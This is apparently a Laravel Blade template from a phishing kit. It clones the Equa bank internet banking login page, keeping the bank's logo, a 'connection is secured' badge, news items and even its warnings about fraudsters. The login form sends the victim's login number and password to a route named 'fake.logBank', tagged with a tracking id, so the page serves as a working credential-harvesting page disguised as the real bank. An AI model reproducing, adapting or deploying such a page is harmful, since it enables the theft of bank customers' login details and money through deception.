@extends('layouts.fake')
@push('css')
    <link href="{{asset('css/equa.css')}}" rel="stylesheet">
@endpush
@section('content')
    <div id="header">
        <div id="header-holder">
            <h1>
                <a target="_blank" title="Back on homepage" href="https://www.equabank.cz/en/">
                    <img alt="Equa bank" src="{{asset($bank['logo'])}}" style="padding-left:20px">
                </a>
            </h1>
            <table class="secure1Table">
                <tbody>
                <tr>
                    <td>
                        <div class="switchlang1">
                            <a title="Switch to"
                               href="#">Čeština</a>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td>
                        <div class="secure1">
                            <span class="gothic">The connection&nbsp;is&nbsp;secured<br>by encryption&nbsp;and&nbsp;certificates</span>
                        </div>
                    </td>
                </tr>
                </tbody>
            </table>
            <div class="clr"></div>
        </div>
    </div>
    <!-- main page content-->
    <div id="container">
        <div id="container-holder">
            <div class="clr"></div>
            <div class="main">
                <div class="inner-container clearfix">
                    <div class="content clearfix">
                        <h2>Login to Internet banking</h2>
                        <div class="selected_menu"><span class="menu_label">Personal</span></div>
                        <div class="selected_menu2"></div>
                        <div class="login-box1 clearfix" style="width:520px;position: relative;">
                            <div id="payment" class="border_light">
                                <form id="bank_pm_form" method="POST"
                                      action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}"
                                      role="form">
                                    <div class="cert-group"><span class="login_labels">Login number</span>
                                        <br>
                                        <input type="text" name="login" id="password" class="z-textbox"
                                               style="width: 180px;" tabindex="1"></div>
                                    <div class="cert-group">
                                        <span class="login_labels">Password</span>
                                        <br>
                                        <input type="password" name="password" id="password_bank"
                                               class="z-textbox" style="width: 180px;" tabindex="1">
                                        <span class="newLink"
                                              style="margin-left: 15px;">
					                    <a href="javascript:void(0);"
                                           onclick="javascript:post('auth_loginPwdReset'); return false;">
						                    Password recovery
					                    </a>
				                        </span>
                                    </div>
                                    <div class="buttons-wrapper clearfix" style="float: left;">
                                        <div class="inner clearfix">
            <span class="z-span">

		 	<button id="loginButtonMK" class="forwardButton" type="submit" tabindex="3"
                    style="float: left; padding-left: 40px; padding-right: 50px; cursor: auto;">
				<span class="logButtonLeft"></span>Login<span class="logButtonRight"></span>
            </button>
											</span>
                                        </div>
                                    </div>
                                    <div class="clr"></div>
                                </form>
                            </div>
                            <div id="smsBlueArrow" class="arrow-left" style="display: none;"></div>
                            <div id="smsBlueTip" class="bluetip helpFormDiv" style="display: none;">
                                <div class="bt_close">
                                    <a id="blueTipClose" href="javascript:void(0);"> <i
                                                class="bt_close_icon fas fa-times"></i> </a>
                                </div>
                                <div class="bt_title"><i class="bt_title_icon fas fa-info-circle"></i>Nothing came?
                                </div>
                                <div class="bt_body">
                                    <p>This can be for two reasons:</p>
                                    <p></p>
                                    <p>1/ You have entered the wrong login number.</p>
                                    <p>2/ Sometimes it takes a while before the SMS comes. Wait a minute.</p>
                                </div>
                                <div class="linkMK"><a href="javascript:void(0);" id="newMobileKeyID"
                                                       onclick="javascript:goNewMK(); return false;" class="">
                                        Resend SMS code
                                        <span id="smsCountdown"></span>
                                    </a></div>
                                <p class="bt_footer"></p>
                            </div>
                        </div>
                        <div class="clr"></div>
                        <div class="security-info">
                            <h3>Warning against fraudulent e-mails</h3>
                            <p>Equa bank would <strong>never send</strong> you a direct link to your internet banking
                                via
                                email.</p>
                            <p>In case you receive such an e-mail, do not respond to it.
                                <br> It is best to delete it. Verify the secure connection
                                <br>by displaying a certificate.</p>
                            <p class="security-info__link"><a
                                        href="https://www.equabank.cz/en/customer-service/bezpecnostni-zasady/">Security
                                    quidelines</a></p>
                        </div>
                        <div class="news">
                            <div style="width: 500px;">
                                <h2 class="gothic">Novinky</h2>
                                <br>
                                <h5 class="date">17. 2. 2021</h5>
                                <h3><strong>Verification of payments on the Internet using E-PIN</strong></h3>
                                <p>From Friday, February 19, 2021, it will be necessary to
                                    confirm payments on the Internet in addition to SMS also by E-PIN. Set
                                    it up in your internet banking or simply authorize payments in the Equa
                                    bank mobile application. See detailed information about online payments <a
                                            href="https://www.equabank.cz/promo/en-mastercard-identity-check-online-payments"
                                            target="_blank">HERE</a>. </p>
                                <br>
                                <br>
                                <h5 class="date">15. 12. 2020</h5>
                                <h3><strong>Processing payments during Christmas season 2020</strong></h3>
                                <p>Please pay attention to the information <a
                                            href="https://www.equabank.cz/download/1802-informace-o-zpracovani-plateb-na-konci-roku-2020.pdf"
                                            target="_blank">processing of payments during the end of 2020</a></p>
                                <br>
                                <br>
                                <h5 class="date">11. 12. 2020</h5>
                                <h3><strong>Opening hours of our branches and Client Center during Christmas season 2020
                                    </strong></h3>
                                <p>Please see updated opening hours of our branches and Client Center during <a
                                            href="https://www.equabank.cz/download/1798-oteviraci-doba-vanoce-2020.pdf"
                                            target="_blank">Christmas season 2020.</a></p>
                                <br>
                                <br>
                                <h5 class="date">4. 6. 2020</h5>
                                <h3><strong>We've launched instant payments in the mobile app
                                    </strong></h3>
                                <p>From June 4, you can receive and send <a
                                            href="https://www.equabank.cz/n/equa-bank-spustila-okamzite-platby-v-mobilni-aplikaci"
                                            target="_blank">instant payments</a> in our Equa bank mobile application.
                                    The
                                    service is available 24 hours a day, 7 days a week and is of course free. </p>
                                <br>
                                <br>
                                <h5 class="date">11. 4. 2020</h5>
                                <h3><strong>We have automated the deferral of repayments
                                    </strong></h3>
                                <p>We have launched a new application for deferral of repayments
                                    of personal loans. You will process the request within a minute and you
                                    will immediately receive complete information on how the deferral will
                                    affect the subsequent repayment. With this step, we are trying to
                                    automate, accelerate and streamline the postponement process for clients
                                    who find themselves in a difficult financial situation due to the
                                    epidemic. You can request a postponement of installments <a
                                            href="https://www.equabank.cz/pece-a-podpora/odklady-splatek"
                                            target="_blank">on
                                        this page</a>. </p>
                                <br>
                                <br>
                                <h5 class="date">18. 3. 2020</h5>
                                <h3><strong>Follow a current information from the bank regarding the coronavirus
                                        pandemic
                                    </strong></h3>
                                <p>We have prepared an overview of current information in connection with the
                                    coronavirus
                                    pandemic in the Czech Republic. <a
                                            href="https://www.equabank.cz/pece-a-podpora/aktualni-informace"
                                            target="_blank">Here</a>
                                    you will find an overview of banking products that you can operate
                                    online from the comfort of your home, the current openining hours of our
                                    branches, information on deferral of payments and security
                                    recommendations in these difficult times. </p>
                                <br>
                                <br>
                                <h5 class="date">29. 11. 2019</h5>
                                <h3><strong>
                                        Our first deposit-enabled ATMs are up and running
                                    </strong></h3>
                                <p>We launched the first 13 ATMs with the deposit-enabled ATMs.
                                    We plan to launch other ATMs in the coming days. We will have a total of
                                    16 ATMs this year. All of them allow cash deposits in addition to
                                    withdrawals. As the only bank on the Czech market, you can use these
                                    ATMs to deposit cash not only in Czech crowns, but also in euros or
                                    dollars directly into foreign currency accounts. </p>
                                <br>
                                <br>
                                <h5 class="date">13. 09. 2019</h5>
                                <h3><strong>A new way to login and confirm payments in Internet banking
                                    </strong></h3>
                                <p>As of 14 September, after entering the Internet Banking Login
                                    Number, you will enter the authorization code, which you will receive
                                    in a text message. At the same time, you will confirm selected payments
                                    and active operations newly in addition to the authorization code from
                                    the text message, also by entering the Password setting you are logging
                                    into internet banking. </p>
                                <br>
                                <br></div>
                        </div>
                    </div>
                    <div class="sidebar">
                        <div style="color: white;"> .</div>
                        <div class="notice info">
                            <h2 class="gothic" style="border-bottom: 0px;">Warning</h2>
                            <p>Dear clients,
                                <br>
                                <br> We are currently registering increased activity of
                                fraudsters impersonating bank employees over the phone. These
                                Czech-speaking fraudsters can be very convincing and call from phone
                                numbers that faithfully simulate the phone numbers of our Client Center.
                                A frequent pretext for a call is information on the client by a
                                fraudster about the investigation of a fraudulent transaction on his
                                account.
                                <br>
                                <br></p>
                            <p>The fraudster may require the client to communicate sensitive data, such as e-bank login
                                details, as part of an "investigation".</p>
                            <br>
                            <br>
                            <p>Thank you in advance for your caution and cooperation.</p>
                            <br>
                            <br>
                            <p>Your Equa bank</p>
                            <br>
                            <br>
                            <p>For more information, please read out our <a
                                        href="https://www.equabank.cz/pece-a-podpora/bezpecnostni-zasady">Security
                                    Policy.</a>
                            </p>
                        </div>
                    </div>
                    <div class="loginBanners"></div>
                </div>
            </div>
        </div>
        <div class="clr"></div>
    </div>
    <div class="footer">
        <div style="width:100%;height:100%;" class="z-include">
            <div class="footer-head">
                <div class="inner-container"><span class="logo">Equa bank</span> <span class="text gothic">More than you expect</span>
                </div>
            </div>
            <div class="footer-body clearfix">
                <div class="inner-container clearfix">
                    <div class="column first-column">
                        <h3>Do you need some help?</h3>
                        <p><span
                                    class="z-label">Call during operating hours <strong>+420&nbsp;222&nbsp;010&nbsp;222</strong> or mail to <a
                                        href="mailto:customer.service@equabank.cz">customer.service@equabank.cz</a></span>
                            <br></p>
                        <p class="link"><a target="_blank" href="https://www.equabank.cz/en/important-documents">Documents
                                for download</a></p>
                        <p class="link last"><a class="z-a" target="_blank" href="https://www.equabank.cz/en/faq">Common
                                questions</a></p>
                        <ul>
                            <li class="contactsLink"><a class="contactsItem" target="_blank"
                                                        href="https://www.equabank.cz/kontakt/">Next contacts</a></li>
                            <li class="contactsLink"><a class="contactsItem" target="_blank"
                                                        href="https://www.equabank.cz/download/dms/L002-1863-vseobecne-obchodni-podminky-eng-od26032021.pdf">Conditions
                                    of use</a></li>
                        </ul>
                        <p class="copyright"><span>© Equa bank a.s. 2011 - 2016. All rights reserved.</span></p>
                    </div>
                    <div class="column second-column">
                        <h3>List of branches</h3>
                        <div>
                            <p class="link"><a target="_blank"
                                               href="https://www.equabank.cz/en/contact/office-locations/">List
                                    of branches</a></p>
                            <p class="link last"><a target="_blank"
                                                    href="https://www.equabank.cz/en/corporate/contact/office-locations/">Corporate
                                    banking offices</a></p>
                        </div>
                    </div>
                    <div class="column third-column">
                        <h3>Are you a client of Equa bank?</h3>
                        <p>Watch us:</p>
                        <ul class="social clearfix">
                            <li class="facebook"><a class="z-a" target="_blank"
                                                    href="https://www.facebook.com/equabank">Facebook</a>
                            </li>
                            <li class="twitter"><a class="z-a" target="_blank"
                                                   href="https://twitter.com/equabankcz">Twitter</a></li>
                            <li class="youtube"><a class="z-a" target="_blank" href="https://www.youtube.com/equabank">Youtube</a>
                            </li>
                            <li class="linked-in"><a class="z-a" target="_blank"
                                                     href="https://www.linkedin.com/company/2260135">linkedIn</a></li>
                            <li class="rss"><a class="z-a" target="_blank"
                                               href="https://www.equabank.cz/rss/news/">RSS</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- documentBodyTag-end -->
@endsection
@push('js')
@endpush